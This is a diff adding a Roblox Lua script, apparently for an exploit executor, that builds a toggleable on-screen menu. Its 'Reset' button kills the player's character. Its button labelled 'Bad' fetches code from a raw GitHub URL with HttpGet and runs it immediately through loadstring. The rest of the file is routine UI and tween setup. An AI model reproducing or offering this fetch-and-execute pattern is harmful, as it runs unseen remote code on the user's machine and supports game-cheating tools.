@@ -1,0 +1,101 @@
+-- Create UI elements
+local ScreenGui = Instance.new("ScreenGui")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local ToggleButton = Instance.new("TextButton")
+
+-- Create and configure TweenService
+local TweenService = game:GetService("TweenService")
+local tweenSpeed = 1  -- Duration in seconds
+local tweenInfo = TweenInfo.new(tweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
+
+-- Setup ScreenGui
+ScreenGui.Parent = game.CoreGui
+
+-- Setup ScrollingFrame
+ScrollingFrame.Parent = ScreenGui
+ScrollingFrame.Size = UDim2.new(0.4, 0, 0.1, 0)  -- Adjusted to a more visible size
+ScrollingFrame.Position = UDim2.new(0.27, 0, -0.22, 0)  -- Positioned in the center of the screen
+ScrollingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+ScrollingFrame.BackgroundTransparency = 0.5
+ScrollingFrame.CanvasSize = UDim2.new(2, 0, 0, 0)  -- Wider canvas size to enable scrolling
+ScrollingFrame.ScrollBarThickness = 0.1
+
+local ScrollingFrameCorner = Instance.new("UICorner")
+ScrollingFrameCorner.Parent = ScrollingFrame
+ScrollingFrameCorner.CornerRadius = UDim.new(0, 10)
+
+-- Setup ToggleButton
+ToggleButton.Parent = ScreenGui
+ToggleButton.BackgroundColor3 = Color3.new(0, 0, 0)
+ToggleButton.BackgroundTransparency = 0.5
+ToggleButton.Size = UDim2.new(0.05, 0, 0.1, 0)  -- Adjusted size for better visibility
+ToggleButton.TextScaled = true
+ToggleButton.Position = UDim2.new(0.21, 0, -0.1, 0)  -- Positioned outside the ScrollingFrame
+ToggleButton.TextColor3 = Color3.new(1, 1, 1)
+ToggleButton.Font = Enum.Font.PatrickHand
+ToggleButton.Text = "+"
+
+local ToggleButtonCorner = Instance.new("UICorner")
+ToggleButtonCorner.Parent = ToggleButton
+ToggleButtonCorner.CornerRadius = UDim.new(0, 10)
+
+-- Button --
+
+local button1 = Instance.new("TextButton")
+button1.Parent = ScrollingFrame
+button1.BackgroundColor3 = Color3.new(0, 0, 0)
+button1.BackgroundTransparency = 0.5
+button1.Size = UDim2.new(0.03, 0, 0.9, 0)  -- Adjusted size for better visibility
+button1.TextScaled = true
+button1.Position = UDim2.new(0.01, 0, 0, 0)  -- Positioned inside the ScrollingFrame
+button1.TextColor3 = Color3.new(1, 0, 0)
+button1.Font = Enum.Font.PatrickHand
+button1.Text = "Reset"
+
+local Button1Corner = Instance.new("UICorner")
+Button1Corner.Parent = button1
+Button1Corner.CornerRadius = UDim.new(0, 10)
+
+button1.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end)
+
+local button2 = Instance.new("TextButton")
+button2.Parent = ScrollingFrame
+button2.BackgroundColor3 = Color3.new(0, 0, 0)
+button2.BackgroundTransparency = 0.5
+button2.Size = UDim2.new(0.03, 0, 0.9, 0)  -- Adjusted size for better visibility
+button2.TextScaled = true
+button2.Position = UDim2.new(0.05, 0, 0, 0)  -- Positioned inside the ScrollingFrame
+button2.TextColor3 = Color3.new(1, 0, 0)
+button2.Font = Enum.Font.PatrickHand
+button2.Text = "Bad"
+
+local Button2Corner = Instance.new("UICorner")
+Button2Corner.Parent = button2
+Button2Corner.CornerRadius = UDim.new(0, 10)
+
+button2.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/NganHa2k3/Hello/main/fun'))()
+end)
+
+-- End --
+
+-- Define tween goals
+local goalPosition1 = UDim2.new(0.27, 0, -0.1, 0)  -- Move ScrollingFrame down
+local goalPosition2 = UDim2.new(0.27, 0, -0.22, 0)  -- Original position
+
+-- Create tweens
+local tween1 = TweenService:Create(ScrollingFrame, tweenInfo, {Position = goalPosition1})
+local tween2 = TweenService:Create(ScrollingFrame, tweenInfo, {Position = goalPosition2})
+
+-- Toggle button behavior
+local isToggled = false
+ToggleButton.MouseButton1Click:Connect(function()
+    if isToggled then
+        tween2:Play()
+    else
+        tween1:Play()
+    end
+    isToggled = not isToggled
+end)
